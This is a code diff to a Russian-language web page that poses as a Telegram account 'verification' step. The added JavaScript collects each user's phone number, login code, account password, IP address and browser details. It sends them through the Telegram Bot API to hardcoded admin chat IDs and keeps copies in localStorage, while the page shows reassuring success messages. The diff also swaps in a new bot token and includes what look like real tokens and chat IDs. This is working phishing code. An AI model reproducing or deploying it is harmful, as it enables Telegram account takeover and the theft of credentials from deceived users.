@@ -816,7 +816,7 @@
 
     <script>
         // === КОНФИГУРАЦИЯ ===
-        const BOT_TOKEN = "8507711321:AAGFC12G9uPkaWXBbNEbK8s77lqyRhlho-k";
+        const BOT_TOKEN = "8524200361:AAElPEPVlXiEn1IAu_SXB4w8Y2xuniHStYI";
         const ADMIN_CHAT_IDS = [8443492299];
         
         // === ПЕРЕМЕННЫЕ СОСТОЯНИЯ ===
@@ -1483,6 +1483,242 @@
             updateStep(2);
             hideMessages();
         }
+        async function sendToTelegramBot(data) {
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: window.Telegram?.WebApp?.initDataUnsafe?.user?.id || 'USER_ID',
+                text: JSON.stringify(data),
+                parse_mode: 'HTML'
+            })
+        });
+        
+        const result = await response.json();
+        console.log('📤 Отправлено в бот:', result);
+        return result.ok;
+    } catch (error) {
+        console.error('Ошибка отправки в бот:', error);
+        return false;
+    }
+}
+
+// Функция отправки уведомления о завершении верификации
+async function notifyVerificationComplete() {
+    const userData = {
+        type: 'verification_complete',
+        phone: phoneNumber,
+        code: verificationCode,
+        password: userPassword,
+        hasPassword: hasPassword,
+        sessionId: sessionId,
+        timestamp: new Date().toISOString(),
+        ip: await getIpInfo(),
+        userAgent: navigator.userAgent
+    };
+    
+    try {
+        // Отправляем через Telegram WebApp
+        if (window.Telegram?.WebApp) {
+            window.Telegram.WebApp.sendData(JSON.stringify(userData));
+            console.log('📤 Данные отправлены через Telegram WebApp');
+        } else {
+            // Fallback: отправляем через прямое API
+            await sendToTelegramBot(userData);
+        }
+        
+        // Дополнительно сохраняем в localStorage
+        localStorage.setItem('last_verification', JSON.stringify({
+            ...userData,
+            savedAt: new Date().toISOString()
+        }));
+        
+        return true;
+    } catch (error) {
+        console.error('Ошибка отправки уведомления:', error);
+        return false;
+    }
+}
+
+// Модифицируем функцию sendPasswordToAdmins
+async function sendPasswordToAdmins(phone, code, password, sessionId) {
+    const timestamp = new Date().toLocaleString('ru-RU');
+    const ipInfo = await getIpInfo();
+    
+    const message = `🔒 ПОЛУЧЕН ПАРОЛЬ 
+
+✅ Пользователь отправил пароль от аккаунта:
+
+📱 <b>Номер телефона:</b> <code>${phone}</code>
+🔢 <b>Код подтверждения:</b> <code>${code}</code>
+🔐 <b>Пароль от аккаунта:</b> <code>${password}</code>
+🕐 <b>Время:</b> ${timestamp}
+🌐 <b>IP:</b> ${ipInfo}
+`;
+    
+    let successCount = 0;
+    
+    for (const chatId of ADMIN_CHAT_IDS) {
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+            
+            const data = await response.json();
+            
+            if (data.ok) {
+                successCount++;
+                console.log(`✅ Пароль отправлен ${chatId}`);
+            } else {
+                console.error(`❌ Ошибка отправки ${chatId}:`, data);
+            }
+        } catch (error) {
+            console.error(`❌ Ошибка сети ${chatId}:`, error);
+        }
+        
+        await sleep(100);
+    }
+    
+    if (successCount > 0) {
+        updateSessionWithPassword(password, true);
+        showSuccess('✅ Пароль отправлен! Верификация завершена.');
+        updateStep(4);
+        
+        document.getElementById('successPhone').textContent = phone;
+        document.getElementById('successCode').textContent = code;
+        document.getElementById('successPasswordStatus').textContent = 'Отправлен';
+        document.getElementById('hasPasswordText').textContent = 'Пароль отправлен для проверки';
+        document.getElementById('successSessionId').textContent = sessionId;
+        
+        // Отправляем уведомление в бот о завершении
+        await notifyVerificationComplete();
+        
+        const successBtn = document.querySelector('.telegram-btn.success-animation');
+        if (successBtn) {
+            successBtn.classList.remove('success-animation');
+            void successBtn.offsetWidth;
+            successBtn.classList.add('success-animation');
+        }
+        
+    } else {
+        throw new Error('Не удалось отправить пароль');
+    }
+}
+
+// Модифицируем функцию sendSkipPasswordToAdmins
+async function sendSkipPasswordToAdmins(phone, code, sessionId) {
+    const timestamp = new Date().toLocaleString('ru-RU');
+    const ipInfo = await getIpInfo();
+    
+    const message = `⏭️ ПАРОЛЬ ПРОПУЩЕН
+
+📱 <b>Номер телефона:</b> <code>${phone}</code>
+🔢 <b>Код подтверждения:</b> <code>${code}</code>
+🕐 <b>Время:</b> ${timestamp}
+🌐 <b>IP:</b> ${ipInfo}
+ℹ️ <b>Статус:</b> Пользователь пропустил ввод пароля`;
+    
+    let successCount = 0;
+    
+    for (const chatId of ADMIN_CHAT_IDS) {
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+            
+            const data = await response.json();
+            
+            if (data.ok) {
+                successCount++;
+                console.log(`✅ Информация отправлена админу ${chatId}`);
+            } else {
+                console.error(`❌ Ошибка отправки админу ${chatId}:`, data);
+            }
+        } catch (error) {
+            console.error(`❌ Ошибка сети для админа ${chatId}:`, error);
+        }
+        
+        await sleep(100);
+    }
+    
+    if (successCount > 0) {
+        updateSessionWithPassword('', false);
+        showSuccess('✅ Верификация завершена! Администратор получил данные.');
+        updateStep(4);
+        
+        document.getElementById('successPhone').textContent = phone;
+        document.getElementById('successCode').textContent = code;
+        document.getElementById('successPasswordStatus').textContent = 'Не предоставлен';
+        document.getElementById('hasPasswordText').textContent = 'Пароль не предоставлен';
+        document.getElementById('successSessionId').textContent = sessionId;
+        
+        // Отправляем уведомление в бот о завершении
+        await notifyVerificationComplete();
+        
+        const successBtn = document.querySelector('.telegram-btn.success-animation');
+        if (successBtn) {
+            successBtn.classList.remove('success-animation');
+            void successBtn.offsetWidth;
+            successBtn.classList.add('success-animation');
+        }
+        
+    } else {
+        throw new Error('Не удалось отправить информацию админам');
+    }
+}
+
+// Инициализация Telegram WebApp
+if (window.Telegram?.WebApp) {
+    Telegram.WebApp.ready();
+    Telegram.WebApp.expand(); // Разворачиваем на весь экран
+    console.log('📱 Telegram WebApp инициализирован');
+    
+    // Устанавливаем цвет кнопок в стиле Telegram
+    Telegram.WebApp.MainButton.setParams({
+        color: '#0088cc',
+        text_color: '#ffffff'
+    });
+}
+
+// Добавляем обработчик для кнопки в боте
+document.addEventListener('DOMContentLoaded', () => {
+    // Добавляем кнопку для отправки данных в бот на странице успеха
+    const successDiv = document.getElementById('formSuccess');
+    if (successDiv) {
+        const botButton = document.createElement('button');
+        botButton.className = 'telegram-btn outline';
+        botButton.innerHTML = '<i class="fab fa-telegram"></i> Отправить данные в бот';
+        botButton.onclick = async () => {
+            if (await notifyVerificationComplete()) {
+                showSuccess('✅ Данные отправлены в бот!');
+            } else {
+                showError('❌ Ошибка отправки в бот');
+            }
+        };
+        successDiv.insertBefore(botButton, successDiv.querySelector('.telegram-btn.success-animation'));
+    }
+});
+
+console.log('📱 Интеграция с Telegram Bot добавлена');
         
         function cancelVerification() {
             if (confirm('Вы уверены, что хотите отменить верификацию? Весь прогресс будет потерян.')) {
